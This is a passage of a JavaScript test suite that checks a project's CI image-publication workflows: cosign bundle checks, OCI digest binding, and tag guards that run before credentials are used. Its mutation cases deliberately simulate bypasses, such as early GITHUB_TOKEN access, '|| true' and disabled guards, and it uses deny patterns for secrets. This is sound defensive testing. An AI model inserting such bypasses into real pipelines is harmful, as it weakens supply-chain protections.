    ["old media", JSON.stringify({ ...probeBundle(), mediaType: "application/vnd.dev.sigstore.bundle.v0.2+json" })],
    ...[undefined, null, [], "fixture"].map(dsseEnvelope => ["not DSSE", JSON.stringify({ ...probeBundle(), dsseEnvelope })]),
    ["oversized", JSON.stringify(probeBundle("x".repeat(1048576)))],
    ["aggregate oversized", Array(16).fill(JSON.stringify(probeBundle("x".repeat(66000)))).join("\n")],
    ["17 bundles", Array(17).fill(JSON.stringify(probeBundle())).join("\n")],
    ["mixed legacy", JSON.stringify(probeBundle()) + '\n{"Base64Signature":"fixture"}'],
    ["trailing malformed", JSON.stringify(probeBundle()) + "\n{"],
  ];
  for (const [name, download] of invalid) {
    const f = probeFixture();
    try {
      writeFileSync(join(f.dir, "download.jsonl"), download);
      assert.notEqual(f.run(script).status, 0, name);
      assert.equal(f.calls().filter(c => c[1] === "verify-blob").length, 0, `${name}: gate before local verification`);
    } finally { f.cleanup(); }
  }
});

test("root bundle download accepts exactly one MiB but rejects even one extra byte (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const bundle = JSON.stringify(probeBundle());
  for (const extra of ["", " ", "\0"]) {
    const f = probeFixture();
    try {
      writeFileSync(join(f.dir, "download.jsonl"), bundle + " ".repeat(1048576 - Buffer.byteLength(bundle)) + extra);
      const result = f.run(script);
      if (extra === "") assert.equal(result.status, 0, result.stderr);
      else {
        assert.notEqual(result.status, 0, "oversize must fail even when its valid prefix fits exactly");
        assert.equal(f.calls().filter(c => c[1] === "verify-blob").length, 0);
      }
    } finally { f.cleanup(); }
  }
});

test("all four local checks reuse each validated root bundle in a fresh private digest-file-free directory (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  for (const count of [1, 2, 16]) {
    const f = probeFixture();
    try {
      const bundles = Array.from({ length: count }, (_, i) => probeBundle(i % 2 ? "fixture-second" : "fixture-payload"));
      writeFileSync(join(f.dir, "download.jsonl"), bundles.map(JSON.stringify).join("\n"));
      // verify-blob tries files before parsing artifact digests. Neither file may win.
      for (const digest of [f.env.DIGEST, f.env.CHILD]) writeFileSync(join(f.dir, digest), "untrusted pseudo-digest file");
      writeFileSync(join(f.dir, "config.json"), "fixture credential: must not be copied");
      const result = f.run(script, {}, f.dir);
      assert.equal(result.status, 0, result.stderr);
      const calls = f.calls().filter(c => c[0] === "cosign");
      assert.equal(calls.filter(c => c[1] === "download").length, 1);
      assert.equal(calls.filter(c => c[1] === "verify").length, 1);
      assert.ok(calls.filter(c => c[1] !== "verify-blob").every(c => c.at(-1) === f.env.IMAGE + "@" + f.env.DIGEST));
      const local = readFileSync(join(f.dir, "blob-calls"), "utf8").trim().split("\n").map(JSON.parse);
      assert.equal(local.length, 4 * count);
      assert.equal(new Set(local.map(c => c.cwd)).size, count);
      const identity = `https://github.com/${f.env.GITHUB_REPOSITORY}/.github/workflows/image.yml@${f.env.GITHUB_REF}`;
      const issuer = "https://token.actions.githubusercontent.com";
      for (let i = 0; i < count; i++) {
        const group = local.slice(i * 4, i * 4 + 4);
        assert.ok(group.every(c => c.bundle === JSON.stringify(bundles[i]) + "\n" && c.cwd === group[0].cwd));
        assert.deepEqual(group.map(({ artifact, identity, issuer }) => [artifact, identity, issuer]), [
          [f.env.DIGEST, identity, issuer], [f.env.DIGEST, identity.replace("image.yml", "wrong-workflow.yml"), issuer],
          [f.env.DIGEST, identity, "https://wrong-issuer.invalid"], [f.env.CHILD, identity, issuer],
        ]);
        assert.equal(existsSync(group[0].cwd), false, "private data cleaned after success");
      }
    } finally { f.cleanup(); }
  }
});

test("root download and local verification errors never substitute for policy or digest rejection (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const digestFailure = "failed to verify signature: provided artifact digest does not match any digest in statement";
  for (const bad of [
    { DOWNLOAD_ERROR: "no signatures found" }, { DOWNLOAD_ERROR: "Get https://ghcr.io/v2/: connection reset" },
    { ONLINE_ERROR: "no signatures found" }, { LOCAL_POSITIVE_ERROR: "no signatures found" },
    { LOCAL_POSITIVE_ERROR: "TUF: trust root unavailable" },
    ...["\n", "unauthorized", "no signatures found", "TUF: trust root unavailable", "transparency log unavailable",
      "failed to verify signature: invalid signature", "provided artifact digest does not match any digest in statement",
      "no matching attestations: " + digestFailure, digestFailure + "\nconnection reset", digestFailure + "\n",
    ].map(CHILD_ERROR => ({ CHILD_ERROR })),
    { IDENTITY_ERROR: "no matching attestations: failed to verify certificate identity: no matching CertificateIdentity found, last error: unrelated" },
    { NEGATIVE_MODE: "policy-mixed" },
  ]) {
    const f = probeFixture();
    try {
      assert.notEqual(f.run(script, bad).status, 0, JSON.stringify(bad));
      assert.equal(readdirSync(f.dir).some(name => name.startsWith("probe-bundles.")), false, "private data cleaned on failure");
    } finally { f.cleanup(); }
  }
});

test("tampered payload or bad digest in a downloaded bundle fails the local positive control (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  for (const marker of ["fixture-tampered-payload", "fixture-bad-digest"]) {
    const f = probeFixture();
    try {
      writeFileSync(join(f.dir, "download.jsonl"), JSON.stringify(probeBundle(marker)));
      const result = f.run(script);
      assert.notEqual(result.status, 0);
      assert.match(result.stderr, /fixture tampered payload or bad digest/);
      assert.equal(f.calls().filter(c => c[1] === "verify-blob").length, 1, "positive must pass before any negatives");
      assert.equal(readdirSync(f.dir).some(name => name.startsWith("probe-bundles.")), false);
    } finally { f.cleanup(); }
  }
});

test("taiki-e/install-action installs exact versions with its checksum check on", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [name, job] of jobsOf(data)) {
      for (const step of stepsOf(job)) {
        if (typeof step.uses !== "string" || actionName(step.uses) !== "taiki-e/install-action") continue;
        const tools = String(step.with?.tool ?? "").split(",").map(t => t.trim()).filter(Boolean);
        if (!tools.length || tools.some(t => !/^[\w.-]+@\d+\.\d+\.\d+$/.test(t))) found.push(`${file}: job '${name}' tool '${step.with?.tool}' is not name@x.y.z`);
        if (String(step.with?.checksum ?? "true") !== "true") found.push(`${file}: job '${name}' disables the checksum`);
      }
    }
  }
  assert.deepEqual(found, []);
});

test("vendored advisory coverage supplements the unchanged real-graph scan in its read-only pinned-tool job", () => {
  const data = toData(parseStrict(readLocalFromRepo(".github/workflows/ci.yml"), "ci.yml"));
  const job = data.jobs["cargo-deny"];
  assert.equal(jobCanWrite(data, job), false);
  const steps = stepsOf(job);
  const normal = steps.findIndex(s => s.run === "cargo deny --all-features check");
  const fixtures = steps.findIndex(s => s.run === "node --test tests/vendored-advisories.test.mjs");
  const extra = steps.findIndex(s => s.run === "node .github/scripts/vendored-advisories.mjs");
  const install = steps.findIndex(s => s.with?.tool === "cargo-deny@0.20.2");
  const node = steps.findIndex(s => s.uses === "./.github/actions/setup-node");
  assert.ok(install >= 0 && normal > install && fixtures > normal && extra > fixtures && fixtures > node && node >= 0);
  for (const index of [normal, fixtures, extra, install, node]) {
    assert.equal(steps[index].if, undefined);
    assert.equal(steps[index]["continue-on-error"], undefined);
  }
  for (const index of [fixtures, extra]) {
    assert.ok(steps[index].name, "additional coverage is separately labelled");
    assert.equal(steps[index].env?.CI, undefined, "fixture must not bypass its CI-required scanner");
    assert.equal(steps[index].env?.CARGO_DENY, undefined, "same pinned tool on PATH");
  }
});

// ---- isolated publication graph (#371, #372, #374) ----

const publicationFiles = ["image", "branch-images", "loadtest-image", "oci-import"];
const publicationData = () => Object.fromEntries(publicationFiles.map(name => {
  const file = `.github/workflows/${name}.yml`;
  const text = readLocalFromRepo(file);
  assert.notEqual(text, null, `${file} is required`);
  return [name, toData(parseStrict(text, file))];
}));
const executable = job => stepsOf(job).map(s => s.run ?? "").join("\n");

// Pin the actual refusal logic, not just the step name or command substrings.
const VERSION_CHECK_RUN = [
  'revision=$(docker image inspect --format \'{{index .Config.Labels "org.opencontainers.image.revision"}}\' "${IMAGE}@${DIGEST}")',
  '[ "${revision}" = "${SOURCE_REVISION}" ] || { echo \'::error::image source revision mismatch\'; exit 1; }',
  'want=$(sed -n \'s/^version = "\\([^"]*\\)"$/\\1/p\' apps/gateway/Cargo.toml | head -n1)',
  'got=$(docker run --rm "${IMAGE}@${DIGEST}" --version)',
  'echo "image reports: ${got}"',
  'if [ "${got}" != "open-model-gateway ${want}" ]; then',
  '  echo "::error::the image reports \'${got}\', not \'open-model-gateway ${want}\'"',
  '  exit 1',
  'fi',
  'if [ "${REF_TYPE}" = tag ] && [ "${TAG%%-*}" != "v${want}" ]; then',
  '  echo "::error::tag ${TAG} does not match Cargo.toml version ${want}"',
  '  exit 1',
  'fi',
].join("\n");

function assertRequiredPublication(job, conditionalSteps = []) {
  assert.equal(job.if, undefined);
  assert.equal(job["continue-on-error"], undefined);
  assert.equal(job.defaults, undefined);
  for (const step of stepsOf(job)) {
    assert.equal(step["continue-on-error"], undefined);
    assert.equal(step.shell, undefined);
    if (!conditionalSteps.includes(step.name)) assert.equal(step.if, undefined);
  }
}

function assertPublicationGraph(flows) {
  for (const name of publicationFiles.slice(0, 3)) {
    const data = flows[name];
    const build = data.jobs.build;
    assert.deepEqual(build.permissions, { contents: "read" });
    assert.doesNotMatch(JSON.stringify(build), /secrets\.|packages|docker\/login-action|push=true|push-by-digest/);
    const action = stepsOf(build).find(s => actionName(s.uses) === "docker/build-push-action");
    assert.equal(action.with.outputs, "type=oci,dest=${{ runner.temp }}/image.tar,oci-mediatypes=true");
    assert.equal(action.with.push, undefined);
    assert.equal(action.with.tags, undefined);
    assert.equal(action.with.provenance, "mode=max");
    assert.match(action.with.attests, /^type=sbom,generator=mirror\.gcr\.io\/docker\/buildkit-syft-scanner:stable-1@sha256:[0-9a-f]{64}$/);
    const upload = stepsOf(build).find(s => actionName(s.uses) === "actions/upload-artifact");
    assert.equal(upload.with.path, "${{ runner.temp }}/image.tar");
    assert.equal(upload.with["if-no-files-found"], "error");
    assert.equal(upload.with.overwrite, undefined);
    assert.match(executable(build), /\^sha256:\[0-9a-f\]\{64\}\$/);
    const calls = Object.values(data.jobs).filter(j => j.uses === "./.github/workflows/oci-import.yml");
    assert.equal(calls.length, name === "image" ? 2 : 1);
    for (const call of calls) {
      assert.deepEqual(call.permissions, { contents: "read", packages: "write" });
      assert.deepEqual(call.needs, ["build"]);
      assert.equal(call.with.source_revision, name === "image" ? "${{ github.sha }}" : "${{ needs.build.outputs.source_revision }}");
      assert.match(call.with.artifact_id, /^\$\{\{ needs\.build\.outputs\.artifact_id(?:_linux_(?:amd64|arm64))? \}\}$/);
      assert.match(call.with.root_digest, /^\$\{\{ needs\.build\.outputs\.digest(?:_linux_(?:amd64|arm64))? \}\}$/);
      assert.equal(call.with.image_repository, `ghcr.io/ncecere/open-model-gateway${name === "loadtest-image" ? "-loadtest" : ""}`);
    }
    for (const [jobName, job] of jobsOf(data).filter(([, j]) => j.steps && hasWrite(j.permissions))) {
      assert.doesNotMatch(executable(job), /docker (?:build|run|pull)\b|staging\.py|trivy|cargo|npm|oci-layout/);
      for (const step of stepsOf(job).filter(s => actionName(s.uses) === "actions/checkout")) {
        assert.equal(step.with.ref, "${{ github.workflow_sha }}", `${name}/${jobName} uses trusted control code`);
        assert.equal(step.with["persist-credentials"], false);
      }
      assert.match(executable(job), /docker login ghcr\.io --username "\$\{GITHUB_ACTOR\}" --password-stdin/);
      assert.ok(stepsOf(job).some(s => s.if === "always()" && /docker logout ghcr\.io/.test(s.run ?? "")));
    }
  }
  const image = flows.image;
  for (const name of ["build", "import-amd64", "import-arm64", "verify", "publish"]) {
    assertRequiredPublication(image.jobs[name], name === "verify" ? ["Stop isolated staging"] : name === "publish" ? ["Job summary", "Remove registry credentials"] : []);
  }
  const architectures = [
    { platform: "linux/amd64", pair: "linux-amd64", runner: "ubuntu-24.04" },
    { platform: "linux/arm64", pair: "linux-arm64", runner: "ubuntu-24.04-arm" },
  ];
  assert.deepEqual(image.jobs.build.strategy, { "fail-fast": true, matrix: { include: architectures } });
  assert.equal(image.jobs.build["runs-on"], "${{ matrix.runner }}");
  assert.deepEqual(image.jobs.build.outputs, Object.fromEntries(["amd64", "arm64"].flatMap(arch =>
    ["digest", "artifact_id"].map(key => [`${key}_linux_${arch}`, `\${{ steps.record.outputs.${key}_linux_${arch} }}`]))));
  assert.deepEqual(image.jobs.build.steps.find(s => s.id === "record").env, {
    DIGEST: "${{ steps.build.outputs.digest }}", ARTIFACT_ID: "${{ steps.upload.outputs.artifact-id }}",
  });
  for (const arch of ["amd64", "arm64"]) {
    assert.deepEqual(image.jobs[`import-${arch}`].with, {
      artifact_id: `\${{ needs.build.outputs.artifact_id_linux_${arch} }}`,
      root_digest: `\${{ needs.build.outputs.digest_linux_${arch} }}`,
      platform: `linux/${arch}`, image_repository: "ghcr.io/ncecere/open-model-gateway", source_revision: "${{ github.sha }}",
    });
  }
  assert.deepEqual(image.jobs.verify.strategy, { "fail-fast": true, matrix: { include: architectures.map(({ pair, ...a }) => ({
    ...a, import_job: `import-${a.platform.slice(6)}`, digest_output: `digest_linux_${a.platform.slice(6)}`,
  })) } });
  assert.equal(image.jobs.verify["runs-on"], "${{ matrix.runner }}");
  assert.deepEqual(image.jobs.verify.permissions, { contents: "read", packages: "read" });
  assert.equal(image.jobs.verify.env.DIGEST, "${{ needs[matrix.import_job].outputs[matrix.digest_output] }}");
  const versions = image.jobs.verify.steps.filter(s => s.name === "Check the built version");
  assert.equal(versions.length, 1);
  assert.deepEqual(versions[0].env, { REF_TYPE: "${{ github.ref_type }}", TAG: "${{ github.ref_name }}", SOURCE_REVISION: "${{ github.sha }}" });
  assert.equal(versions[0].run.trim(), VERSION_CHECK_RUN);
  const index = image.jobs.publish.steps.find(s => s.id === "index");
  assert.deepEqual(index.env, {
    TAGS: "${{ needs.meta.outputs.tags }}", ANNOTATIONS: "${{ needs.meta.outputs.annotations }}",
    DIGEST_AMD64: "${{ needs.import-amd64.outputs.digest_linux_amd64 }}", DIGEST_ARM64: "${{ needs.import-arm64.outputs.digest_linux_arm64 }}",
  });
  assert.ok(index.run.includes('sources=("${IMAGE}@${DIGEST_AMD64}" "${IMAGE}@${DIGEST_ARM64}")'));
  assert.ok(index.run.includes('docker buildx imagetools create "${args[@]}" "${sources[@]}"'));
  assert.deepEqual(image.jobs.verify.needs, ["import-amd64", "import-arm64"]);
  assert.deepEqual(image.jobs.publish.needs, ["meta", "import-amd64", "import-arm64", "verify"]);
  assert.equal(image.jobs.meta.if, PROBE_META_IF);
  assert.match(executable(image.jobs.verify), /restore-check/);
  assert.match(executable(image.jobs.verify), /tests\/container-image\.test\.mjs/);
  assert.match(executable(image.jobs.verify), /trivy image/);
  assertCosignPublishPolicy(image);
  assert.equal(flows["loadtest-image"].jobs.build.steps.find(s => actionName(s.uses) === "docker/build-push-action").with["build-args"], "CARGO_BUILD_JOBS=4");
  for (const name of ["branch-images", "loadtest-image"]) {
    const publish = flows[name].jobs.publish;
    assert.deepEqual(publish.needs, ["build", "import"]);
    assert.match(executable(publish), /\^\[0-9a-f\]\{40\}\$/);
    assert.match(executable(publish), /dev-\$\{SOURCE_REVISION:0:12\}/);
    assert.doesNotMatch(executable(publish), /latest|cosign|trivy/);
  }
  const importer = flows["oci-import"];
  assert.deepEqual(Object.keys(importer.on.workflow_call.inputs).sort(), ["artifact_id", "image_repository", "platform", "root_digest", "source_revision"]);
  for (const input of Object.values(importer.on.workflow_call.inputs)) assert.deepEqual(input, { required: true, type: "string" });
  for (const name of ["tools", "preflight"]) assert.deepEqual(importer.jobs[name].permissions, { contents: "read" });
  assert.deepEqual(importer.jobs.import.permissions, { contents: "read", packages: "write" });
  assert.deepEqual(importer.jobs.import.needs, ["tools", "preflight"]);
  for (const job of Object.values(importer.jobs)) {
    const checkouts = stepsOf(job).filter(s => actionName(s.uses) === "actions/checkout");
    assert.equal(checkouts.length, 1);
    assert.deepEqual(checkouts[0].with, { ref: "${{ github.workflow_sha }}", path: "control", "persist-credentials": false });
  }
  for (const job of Object.values(importer.jobs)) {
    assert.equal(job.if, undefined);
    assert.equal(job["continue-on-error"], undefined);
    for (const step of stepsOf(job)) {
      assert.equal(step["continue-on-error"], undefined);
      if (!step.name?.startsWith("Remove ")) assert.equal(step.if, undefined);
    }
  }
  const tools = executable(importer.jobs.tools);
  assert.match(tools, /bash control\/\.github\/scripts\/build-oras\.sh/);
  assert.match(tools, /binary_sha256/);
  assert.match(tools, /sha256sum/);
  const imports = stepsOf(importer.jobs.import);
  const downloads = imports.filter(s => actionName(s.uses) === "actions/download-artifact");
  assert.equal(downloads.length, 2);
  assert.deepEqual(downloads.map(s => s.with["artifact-ids"]).sort(), ["${{ inputs.artifact_id }}", "${{ needs.tools.outputs.artifact_id }}"].sort());
  for (const step of [...downloads, ...stepsOf(importer.jobs.preflight).filter(s => actionName(s.uses) === "actions/download-artifact")]) {
    assert.equal(step.with["merge-multiple"], true);
    for (const key of ["name", "pattern", "run-id", "repository", "github-token"]) assert.equal(step.with[key], undefined);
  }
  for (const name of ["preflight", "import"]) {
    const script = executable(importer.jobs[name]);
    assert.match(script, /inspect_archive/);
    assert.match(script, /org\.opencontainers\.image\.revision/);
    assert.match(script, /\^\[1-9\]\[0-9\]\*\$/);
    assert.match(script, /ghcr\.io\/ncecere\/open-model-gateway\|ghcr\.io\/ncecere\/open-model-gateway-loadtest/);
    assert.doesNotMatch(script, /tar -x|GITHUB_PATH|docker|cargo|npm|trivy/);
  }
  const stage = imports.find(s => /oci-stage\.py/.test(s.run ?? ""));
  assert.ok(stage);
  assert.deepEqual(Object.keys(stage.env).sort(), ["GITHUB_ACTOR", "GITHUB_TOKEN"]);
  assert.match(stage.run, /--archive .* --root .* --platform .* --image .* --tool /);
  assert.match(stage.run, /\[ "\$\{digest\}" = "\$\{ROOT_DIGEST\}" \]/);
  assert.match(executable(importer.jobs.import), /binary_sha256/);
  assert.match(executable(importer.jobs.import), /sha256sum/);
}

function assertPublicationTagGuard(image) {
  assert.deepEqual(image.env, { IMAGE: "ghcr.io/ncecere/open-model-gateway" });
  const publish = image.jobs.publish;
  assertRequiredPublication(publish, ["Job summary", "Remove registry credentials"]);
  assert.equal(publish.env, undefined);
  const steps = stepsOf(publish);
  const guards = steps.filter(s => s.name === "Validate publication tags before credentials");
  assert.equal(guards.length, 1);
  const guard = guards[0];
  assert.deepEqual(guard, {
    name: "Validate publication tags before credentials",
    env: { TAGS: "${{ needs.meta.outputs.tags }}", GITHUB_REF: "${{ github.ref }}", GITHUB_SHA: "${{ github.sha }}" },
    run: "python3 -I .github/scripts/publication-tags.py",
  });
  const checkout = steps.find(s => actionName(s.uses) === "actions/checkout");
  assert.deepEqual(checkout.with, { ref: "${{ github.workflow_sha }}", "persist-credentials": false });
  assert.ok(steps.indexOf(checkout) < steps.indexOf(guard));
  const credentials = steps.filter(s => /secrets\.|docker login/.test(JSON.stringify(s)));
  assert.ok(credentials.length > 0);
  for (const step of credentials) assert.ok(steps.indexOf(guard) < steps.indexOf(step));
  const index = steps.find(s => s.id === "index");
  assert.ok(steps.indexOf(guard) < steps.indexOf(index));
  assert.equal(index.env.TAGS, guard.env.TAGS);
  assert.equal(index.env.IMAGE, undefined);
}

// Final publication binds native create metadata, the complete approved child graph,
// and every mutable alias. Stand-ins below are not native registry acceptance.
function assertNativeIndexBinding(image) {
  const run = image.jobs.publish.steps.find(s => s.id === "index").run;
  assert.match(run, /^set -euo pipefail\n/);
  assert.match(run, /umask 077/);
  assert.match(run, /mktemp -d/);
  assert.match(run, /trap .* EXIT/);
  assert.match(run, /docker buildx imagetools create "\$\{args\[@\]\}" "\$\{sources\[@\]\}" --metadata-file "\$\{private\}\/metadata\.json"/);
  assert.match(run, /jq -er '\."containerimage\.descriptor"\.digest'/);
  assert.doesNotMatch(run, /containerimage\.digest|first=|head -n|json \.Manifest|platforms=|--platform|--append|\|\| true/);
  for (const [file, digest] of [["amd64", "DIGEST_AMD64"], ["arm64", "DIGEST_ARM64"], ["index", "digest"]]) {
    assert.ok(run.includes(`docker buildx imagetools inspect --raw "\${IMAGE}@\${${digest}}" > "\${private}/${file}.json"`));
  }
  assert.ok(run.includes('python3 -I .github/scripts/oci-index.py "${private}/metadata.json"'));
  assert.match(run, /while IFS= read -r tag; do[\s\S]*inspect --raw "\$\{tag\}"/);
  assert.match(run, /sha256sum "\$\{private\}\/tag\.json"/);
  assert.match(run, /\[ "sha256:\$\{hashed%% \*\}" = "\$\{digest\}" \]/);
  assert.ok(run.indexOf('oci-index.py') < run.indexOf('sha256sum'));
  assert.ok(run.indexOf('sha256sum') < run.indexOf('echo "digest=${digest}"'));
}

test("native final publication binds create descriptor, complete graph and every alias before output (#372)", () => {
  assertNativeIndexBinding(publicationData().image);
});

test("final publication policy rejects mutable-root and platform-only regressions (#372)", () => {
  const original = publicationData().image;
  for (const [before, after] of [
    ['set -euo pipefail', 'set -e'],
    ['--metadata-file', '--other-file'],
    ['."containerimage.descriptor".digest', '."containerimage.digest"'],
    ['oci-index.py', 'platform-only.py'],
    ['"${IMAGE}@${DIGEST_AMD64}" >', '"${IMAGE}:latest-release" >'],
    ['sha256sum "${private}/tag.json"', 'echo ignored'],
    ['[ "sha256:${hashed%% *}" = "${digest}" ]', 'true'],
  ]) {
    const image = structuredClone(original), step = image.jobs.publish.steps.find(s => s.id === "index");
    assert.ok(step.run.includes(before), before);
    step.run = step.run.replace(before, after);
    assert.throws(() => assertNativeIndexBinding(image), { name: "AssertionError" });
  }
});

function nativeIndexFixture() {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "oci-index-policy-"))), bin = join(dir, "bin");
  mkdirSync(bin);
  const hash = data => `sha256:${createHash("sha256").update(data).digest("hex")}`;
  const mediaType = "application/vnd.oci.image.index.v1+json";
  const parent = arch => {
    const digest = hash(arch), evidence = hash(arch + "-evidence");
    return { schemaVersion: 2, mediaType, manifests: [
      { mediaType: "application/vnd.oci.image.manifest.v1+json", digest, size: 123, platform: { os: "linux", architecture: arch } },
      { mediaType: "application/vnd.oci.image.manifest.v1+json", digest: evidence, size: 321, platform: { os: "unknown", architecture: "unknown" },
        annotations: { "vnd.docker.reference.type": "attestation-manifest", "vnd.docker.reference.digest": digest } },
    ] };
  };
  const amd = parent("amd64"), arm = parent("arm64");
  const index = { schemaVersion: 2, mediaType, manifests: [...amd.manifests, ...arm.manifests] };
  const raced = structuredClone(index);
  raced.manifests[0].digest = hash("different-valid-amd64");
  raced.manifests[1].annotations["vnd.docker.reference.digest"] = raced.manifests[0].digest;
  const env = { ...process.env, PATH: `${bin}:${process.env.PATH}`, RUNNER_TEMP: dir,
    IMAGE: "ghcr.io/ncecere/open-model-gateway", FIXTURE_DIR: dir, GITHUB_OUTPUT: join(dir, "output") };
  for (const [file, value] of Object.entries({ amd, arm, index, raced })) {
    const raw = JSON.stringify(value);
    writeFileSync(join(dir, file + ".json"), raw);
    env[file.toUpperCase() + "_DIGEST"] = hash(raw);
  }
  env.DIGEST_AMD64 = env.AMD_DIGEST;
  env.DIGEST_ARM64 = env.ARM_DIGEST;
  env.TAGS = `${env.IMAGE}:latest-release\n${env.IMAGE}:v0.9.0\n${env.IMAGE}:v0.9`;
  env.ANNOTATIONS = "index:org.opencontainers.image.title=fixture title\nindex:fixture=unicode-é";
  writeFileSync(join(bin, "docker"), `#!${process.execPath}
const fs = require('node:fs'), path = require('node:path');
const e = process.env, a = process.argv.slice(2), base = e.FIXTURE_DIR;
const fail = () => process.exit(9);
fs.appendFileSync(path.join(base, 'calls'), JSON.stringify(a) + '\\n');
if (a.slice(0, 3).join(' ') === 'buildx imagetools create') {
  if (e.FAIL_CREATE) fail();
  if (a.includes('--metadata-file')) {
    const file = a[a.indexOf('--metadata-file') + 1];
    fs.writeFileSync(file, JSON.stringify({ 'containerimage.descriptor': {
      mediaType: 'application/vnd.oci.image.index.v1+json', digest: e.INDEX_DIGEST,
      size: fs.statSync(path.join(base, 'index.json')).size }, 'image.name': e.TAGS.split('\\n').join(',') }));
    fs.writeFileSync(path.join(base, 'private'), JSON.stringify({ file,
      mode: fs.statSync(path.dirname(file)).mode & 0o777, fileMode: fs.statSync(file).mode & 0o777 }));
  }
} else if (a.slice(0, 3).join(' ') === 'buildx imagetools inspect') {
  const ref = a.find(x => x.startsWith(e.IMAGE)), isTag = !ref.includes('@');
  if (!a.includes('--raw')) { process.stdout.write(JSON.stringify({ digest: e.RACED_DIGEST })); return; }
  if (e.FAIL_INSPECT) fail();
  let file;
  if (isTag) file = e.RACE && (e.RACE === 'all' || ref.endsWith(':v0.9.0')) ? 'raced' : 'index';
  else {
    const d = ref.split('@')[1];
    file = d === e.AMD_DIGEST ? 'amd' : d === e.ARM_DIGEST ? 'arm' : d === e.INDEX_DIGEST ? 'index' : d === e.RACED_DIGEST ? 'raced' : null;
  }
  if (!file) fail();
  process.stdout.write(fs.readFileSync(path.join(base, file + '.json')));
} else fail();
`);
  chmodSync(join(bin, "docker"), 0o700);
  return { dir, env, run(changes = {}) {
    const script = publicationData().image.jobs.publish.steps.find(s => s.id === "index").run;
    const result = runBash(["-c", script], { cwd: root, env: { ...env, ...changes }, encoding: "utf8", timeout: 10000 });
    assert.ifError(result.error);
    const calls = readFileSync(join(dir, "calls"), "utf8").trim().split("\n").map(JSON.parse);
    if (existsSync(join(dir, "private"))) {
      const privateData = JSON.parse(readFileSync(join(dir, "private"), "utf8"));
      assert.equal(privateData.mode, 0o700);
      assert.equal(privateData.fileMode, 0o600);
      assert.equal(existsSync(join(privateData.file, "..")), false, "private directory cleaned on every exit");
    }
    return { ...result, calls, output: existsSync(env.GITHUB_OUTPUT) ? readFileSync(env.GITHUB_OUTPUT, "utf8") : "" };
  } };
}

for (const race of ["all", "second"]) test(`actual native publication fails closed on ${race} alias race without signing output (#372)`, () => {
  const f = nativeIndexFixture();
  try {
    const result = f.run({ RACE: race });
    assert.notEqual(result.status, 0);
    assert.equal(result.output, "");
    assert.ok(result.calls.some(a => a.includes(f.env.IMAGE + "@" + f.env.INDEX_DIGEST)), "candidate comes from create metadata");
    assert.ok(!result.calls.some(a => a.includes(f.env.IMAGE + "@" + f.env.RACED_DIGEST)), "never select the raced root");
    assert.ok(result.calls.filter(a => a[2] === "inspect").every(a => a.includes("--raw")));
  } finally { rmSync(f.dir, { recursive: true, force: true }); }
});

test("actual native publication accepts reordered aliases at the creation digest and preserves exact create inputs (#372)", () => {
  for (const reverse of [false, true]) {
    const f = nativeIndexFixture();
    try {
      if (reverse) f.env.TAGS = f.env.TAGS.split("\n").reverse().join("\n");
      const result = f.run();
      assert.equal(result.status, 0, result.stderr);
      assert.equal(result.output, `digest=${f.env.INDEX_DIGEST}\n`);
      const metadata = JSON.parse(readFileSync(join(f.dir, "private"), "utf8")).file;
      assert.deepEqual(result.calls[0], ["buildx", "imagetools", "create",
        ...f.env.TAGS.split("\n").flatMap(t => ["--tag", t]),
        ...f.env.ANNOTATIONS.split("\n").flatMap(a => ["--annotation", a]),
        `${f.env.IMAGE}@${f.env.DIGEST_AMD64}`, `${f.env.IMAGE}@${f.env.DIGEST_ARM64}`, "--metadata-file", metadata]);
      assert.deepEqual(result.calls.slice(1).map(a => a.at(-1)), [
        `${f.env.IMAGE}@${f.env.DIGEST_AMD64}`, `${f.env.IMAGE}@${f.env.DIGEST_ARM64}`,
        `${f.env.IMAGE}@${f.env.INDEX_DIGEST}`, ...f.env.TAGS.split("\n")]);
    } finally { rmSync(f.dir, { recursive: true, force: true }); }
  }
});

test("actual native publication never emits a signing digest after create or inspect failure (#372)", () => {
  for (const key of ["FAIL_CREATE", "FAIL_INSPECT"]) {
    const f = nativeIndexFixture();
    try {
      const result = f.run({ [key]: "1" });
      assert.notEqual(result.status, 0);
      assert.equal(result.output, "");
      assert.equal(readdirSync(f.dir).filter(n => n.startsWith("oci-index.")).length, 0);
    } finally { rmSync(f.dir, { recursive: true, force: true }); }
  }
});

test("native image writer guards the exact trusted tag set before credential access", () => assertPublicationTagGuard(publicationData().image));

test("publication tag guard policy refuses missing, optional, bypassed and late guards", () => {
  const original = publicationData().image;
  const guard = image => image.jobs.publish.steps.find(s => s.name === "Validate publication tags before credentials");
  for (const mutate of [
    i => { i.jobs.publish.steps = i.jobs.publish.steps.filter(s => s !== guard(i)); },
    i => { guard(i).if = "false"; },
    i => { guard(i)["continue-on-error"] = true; },
    i => { guard(i).run = "echo no-check"; },
    i => { guard(i).run += " || true"; },
    i => { guard(i).env.GITHUB_REF = "${{ needs.meta.outputs.ref }}"; },
    i => { guard(i).env.GITHUB_SHA = "${{ needs.meta.outputs.sha }}"; },
    i => { guard(i).env.TAGS = "${{ github.ref }}"; },
    i => { const s = guard(i); i.jobs.publish.steps = i.jobs.publish.steps.filter(step => step !== s); i.jobs.publish.steps.push(s); },
    i => { const s = guard(i); i.jobs.publish.steps = i.jobs.publish.steps.filter(step => step !== s); i.jobs.publish.steps.unshift(s); },
    i => { i.jobs.publish.steps.unshift({ env: { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }, run: "echo early-access" }); },
    i => { i.jobs.publish.steps.find(s => actionName(s.uses) === "actions/checkout").with.ref = "${{ github.sha }}"; },
    i => { i.env.IMAGE = "ghcr.io/other/image"; },
    i => { i.jobs.publish.steps.find(s => s.id === "index").env.TAGS = "${{ needs.meta.outputs.other_tags }}"; },
  ]) {
    const image = structuredClone(original);
    mutate(image);
    assert.throws(() => assertPublicationTagGuard(image), { name: "AssertionError" });
  }
});

test("tool handoff names distinguish job-only reruns without replacing immutable artifacts", () => {
  const upload = publicationData()["oci-import"].jobs.tools.steps.find(s => actionName(s.uses) === "actions/upload-artifact");
